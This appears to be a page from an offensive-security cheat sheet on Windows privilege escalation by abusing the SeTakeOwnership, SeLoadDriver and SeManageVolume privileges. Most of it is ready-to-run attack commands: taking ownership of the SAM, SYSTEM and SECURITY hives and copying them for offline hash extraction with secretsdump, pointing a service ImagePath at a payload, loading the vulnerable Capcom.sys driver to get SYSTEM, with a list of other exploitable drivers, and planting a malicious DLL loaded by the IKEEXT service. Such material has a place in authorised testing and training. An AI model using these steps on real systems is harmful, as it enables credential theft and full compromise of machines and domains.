---
title: 'SeTakeOwnership & SeLoadDriver'
description: 'Exploiting SeTakeOwnershipPrivilege for file access and SeLoadDriverPrivilege for kernel-mode code execution via vulnerable drivers.'
---

# SeTakeOwnership & SeLoadDriver

---

## SeTakeOwnershipPrivilege

### When You See This

- Members of the **Administrators** group
- Explicitly assigned via Local Security Policy

```cmd
whoami /priv | findstr SeTakeOwnership
```

### What It Allows

Take ownership of **any securable object** (files, registry keys, AD objects), then modify its DACL to grant yourself full access.

### Exploitation Flow

```
Take ownership → Grant yourself Full Control → Read/Modify the file
```

```cmd
:: Step 1: Take ownership
takeown /f "C:\Windows\System32\config\SAM"

:: Step 2: Grant yourself Full Control
icacls "C:\Windows\System32\config\SAM" /grant YourUser:F

:: Step 3: Copy the file
copy "C:\Windows\System32\config\SAM" C:\temp\SAM
```

### High-Value Target Files

| Target File | Contents | What to Do |
|:-----------|:---------|:-----------|
| `C:\Windows\System32\config\SAM` | Local password hashes | Copy + decrypt with `secretsdump` |
| `C:\Windows\System32\config\SYSTEM` | Boot key for SAM decryption | Copy alongside SAM |
| `C:\Windows\System32\config\SECURITY` | LSA secrets, cached domain creds | Copy alongside SAM |
| `C:\Windows\NTDS\ntds.dit` | All AD domain hashes (on DCs) | Copy + decrypt with `secretsdump` |
| `C:\inetpub\wwwroot\web.config` | IIS connection strings, DB creds | Read directly |
| `C:\Windows\repair\SAM` | Backup SAM (sometimes present) | Copy + decrypt |

### Full Extraction Workflow

```cmd
:: Take ownership and extract SAM + SYSTEM + SECURITY
takeown /f "C:\Windows\System32\config\SAM"
takeown /f "C:\Windows\System32\config\SYSTEM"
takeown /f "C:\Windows\System32\config\SECURITY"

icacls "C:\Windows\System32\config\SAM" /grant %username%:F
icacls "C:\Windows\System32\config\SYSTEM" /grant %username%:F
icacls "C:\Windows\System32\config\SECURITY" /grant %username%:F

copy "C:\Windows\System32\config\SAM" C:\temp\SAM
copy "C:\Windows\System32\config\SYSTEM" C:\temp\SYSTEM
copy "C:\Windows\System32\config\SECURITY" C:\temp\SECURITY
```

```bash
# On attacker machine
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Registry Key Ownership

You can also take ownership of registry keys to modify service configurations:

```cmd
:: Take ownership of a service registry key
takeown /f "HKLM\SYSTEM\CurrentControlSet\Services\TargetService" /r

:: Then modify the ImagePath to point to your payload
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TargetService" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\payload.exe" /f
```

---

## SeLoadDriverPrivilege

### When You See This

- Members of the **Print Operators** group (on Domain Controllers)
- Explicitly assigned via Group Policy

```cmd
whoami /priv | findstr SeLoadDriver
```

### What It Allows

Load and unload **kernel-mode device drivers**. Since drivers run in Ring 0 (kernel space), a vulnerable driver gives you unrestricted system access.

### Exploitation — Capcom.sys Technique

Uses a legitimately signed but intentionally vulnerable driver (`Capcom.sys`) that exposes a kernel-mode code execution interface via `IOCTL`.

**Tools needed**:

| Tool | Purpose | Repo |
|:-----|:--------|:-----|
| `EoPLoadDriver.exe` | Registers and loads a driver | [TarlogicSecurity/EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) |
| `Capcom.sys` | Vulnerable signed driver | [FuzzySecurity/Capcom-Rootkit](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) |
| `ExploitCapcom.exe` | Uses Capcom.sys for code exec | [tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) |

```cmd
:: Step 1: Register and load the vulnerable driver
EoPLoadDriver.exe System\CurrentControlSet\CapcomDrv C:\temp\Capcom.sys

:: Step 2: Exploit the driver to get SYSTEM
ExploitCapcom.exe
```

### How Capcom.sys Works

1. `EoPLoadDriver` creates a registry key under `HKLM\System\CurrentControlSet\CapcomDrv` pointing to `Capcom.sys`
2. It then calls `NtLoadDriver()` to load the driver into kernel space
3. `ExploitCapcom` sends an IOCTL to Capcom.sys requesting kernel-mode code execution
4. Capcom.sys disables SMEP (Supervisor Mode Execution Prevention) and executes user-supplied shellcode in Ring 0
5. The shellcode steals the SYSTEM token and assigns it to the current process

### Alternative: Bring Your Own Vulnerable Driver (BYOVD)

If `Capcom.sys` is blocked by Driver Signature Enforcement, there are other signed-but-vulnerable drivers:

| Driver | Vulnerability |
|:-------|:-------------|
| `DBUtil_2_3.sys` (Dell) | Arbitrary read/write in kernel memory |
| `RTCore64.sys` (MSI Afterburner) | Arbitrary read/write via IOCTL |
| `AsIO.sys` (ASUS) | Physical memory access |

**Reference**: [loldrivers.io](https://www.loldrivers.io/) — Database of known vulnerable drivers

---

## SeManageVolumePrivilege

### What It Allows

Perform maintenance tasks on volumes. Can be abused for arbitrary file write through low-level disk operations.

```cmd
whoami /priv | findstr SeManageVolume
```

### Exploitation

**Repo**: [github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

```cmd
:: Step 1: Exploit to gain write access to C:\Windows\System32
SeManageVolumeExploit.exe

:: Step 2: Place malicious DLL
copy evil.dll C:\Windows\System32\wlbsctrl.dll

:: Step 3: Trigger service that loads the DLL
sc stop IKEEXT
sc start IKEEXT
```
